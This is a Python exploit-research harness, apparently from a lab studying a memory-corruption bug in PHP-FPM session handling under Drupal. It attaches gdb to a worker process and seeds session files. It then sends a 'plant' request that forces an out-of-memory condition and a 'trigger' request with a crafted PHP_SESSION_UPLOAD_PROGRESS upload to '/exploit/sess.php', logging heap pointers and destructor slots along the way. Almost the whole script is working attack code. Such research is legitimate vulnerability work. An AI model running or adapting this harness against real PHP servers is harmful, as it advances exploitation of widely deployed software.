#!/usr/bin/env python3
"""Plant via script-level OOM (worker survives), then trigger via upload-progress decode before RINIT."""
import json, os, re, subprocess, sys, time
LAB = "/tmp/opencode/research/drupal_fpm_20261022T013000Z"
sys.path.insert(0, LAB)
import tool
from tool import field, filepart

WORKER = int(sys.argv[1]) if len(sys.argv)>1 else 155503
GDB = sys.argv[2] if len(sys.argv)>2 else LAB+"/gdb/gb_cal.gdb"
OUT = LAB + "/arms/plant_trigger_%d.json" % WORKER

def current_worker():
    for d in os.listdir('/proc'):
        if not d.isdigit(): continue
        try:
            ppid=int(open('/proc/%s/stat'%d).read().split()[3]); cmd=open('/proc/%s/cmdline'%d,'rb').read().replace(b'\0',b' ').decode('latin1')
        except: continue
        if ppid==144755 and 'pool lab' in cmd: return int(d)
    return None

def parse_req(lines, n):
    out={}
    for l in lines:
        if 'REQ%d '%n not in l: continue
        m=re.search(r"PHPRQ_START heap=(0x[0-9a-f]+)", l)
        if m: out['heap']=int(m.group(1),16)
        m=re.search(r"SESSION_DECODE str=(0x[0-9a-f]+) len=(\d+)", l)
        if m: out['X']=int(m.group(1),16); out['Xlen']=int(m.group(2))
        m=re.search(r"TMPVAR entry P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+) used_slots=(-?\d+) next=(0x[0-9a-f]+)", l)
        if m:
            out['P']=int(m.group(1),16); out['last_dtor']=int(m.group(2),16); out['used_slots']=int(m.group(3)); out['next']=int(m.group(4),16)
        m=re.search(r"TMPVAR ret slot=(0x[0-9a-f]+) dtor=(0x[0-9a-f]+) off=(\d+) used_now=(\d+)", l)
        if m:
            out.setdefault('ret_slots',[]).append({'slot':int(m.group(1),16),'dtor':int(m.group(2),16),'off':int(m.group(3)),'used_now':int(m.group(4))})
        m=re.search(r"SHUTDOWN DAT P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+)", l)
        if m: out['shutdown_P']=int(m.group(1),16); out['shutdown_dtor']=int(m.group(2),16)
        m=re.search(r"PSFILES_OPEN basedir ZSTR ptr=(0x[0-9a-f]+) rc=\d+ ti=0x[0-9a-f]+ h=0x[0-9a-f]+ len=(\d+) val=(.*)$", l)
        if m: out['basedir_ptr']=int(m.group(1),16); out['basedir_len']=int(m.group(2)); out['basedir_val']=m.group(3)
        m=re.search(r"PSFILES_OPEN key ZSTR ptr=(0x[0-9a-f]+).* len=(\d+) val=(.*)$", l)
        if m: out['key_ptr']=int(m.group(1),16); out['key_len']=int(m.group(2)); out['key_val']=m.group(3)
        m=re.search(r"PS_WRITE val=(0x[0-9a-f]+) len=(\d+) head=([0-9a-f]+)", l)
        if m: out['write_val']=int(m.group(1),16); out['write_len']=int(m.group(2)); out['write_head']=m.group(3)
        m=re.search(r"ZEND_BAILOUT bg=(0x[0-9a-f]+)/(-?\d+)", l)
        if m: out.setdefault('bailouts',[]).append((int(m.group(1),16), int(m.group(2))))
    return out

w=current_worker()
res={'worker0':w,'gdb':GDB}
if w != WORKER: res['worker_note']='expected %d got %s'%(WORKER,w)
open(tool.GLOG,'w').close()
gout=open(LAB+'/logs/gdb_plant_trigger.out','wb')
g=subprocess.Popen(['gdb','-q','--batch','-x',GDB,'-p',str(w)],stdout=gout,stderr=subprocess.STDOUT,cwd=LAB,start_new_session=True)
armed=False
for _ in range(200):
    if os.path.exists(tool.GLOG) and 'armed' in open(tool.GLOG,errors='replace').read(): armed=True; break
    time.sleep(0.1)
res['gdb_armed']=armed
if not armed:
    print(open(LAB+'/logs/gdb_plant_trigger.out',errors='replace').read()[-4000:]); raise SystemExit(2)

# plant script OOM
res['plant_seed']=tool.seed(os.path.join(tool.SESS,'sess_pl1'),tool.PLANT_REC)
n0=tool.req_count()
r=tool.post('/exploit/sess.php',[field('form',b'x')],tag='pt_plant',timeout=60,cookie='pl1')
res['plant']={'status':r['status'],'head':r['body'][:160].decode('latin1')}
time.sleep(0.8)
res['plant_req']=parse_req(tool.lines_for(n0+1),n0+1)
res['worker_after_plant']=current_worker()

# trigger upload progress, benign 65000
L=65000
Lx=L-8-len(str(L))
while True:
    t=8+len(str(Lx))+Lx
    if t==L: break
    Lx+=L-t
rec=b'x|s:%d:"'%Lx+b'A'*Lx+b'";'
assert len(rec)==L
res['trigger_seed']=tool.seed(os.path.join(tool.SESS,'sess_tb1'),rec)
n1=tool.req_count()
r=tool.post('/exploit/sess.php',[field('PHP_SESSION_UPLOAD_PROGRESS',b'x'),filepart()],tag='pt_trigger',timeout=120,cookie='tb1')
res['trigger']={'status':r['status'],'head':r['body'][:240].decode('latin1')}
time.sleep(1.0)
res['trigger_req']=parse_req(tool.lines_for(n1+1),n1+1)
res['worker_after_trigger']=current_worker()
res['file']={'len':os.path.getsize(os.path.join(tool.SESS,'sess_tb1'))}
json.dump(res,open(OUT,'w'),indent=1)
print(json.dumps(res,indent=1,default=str))
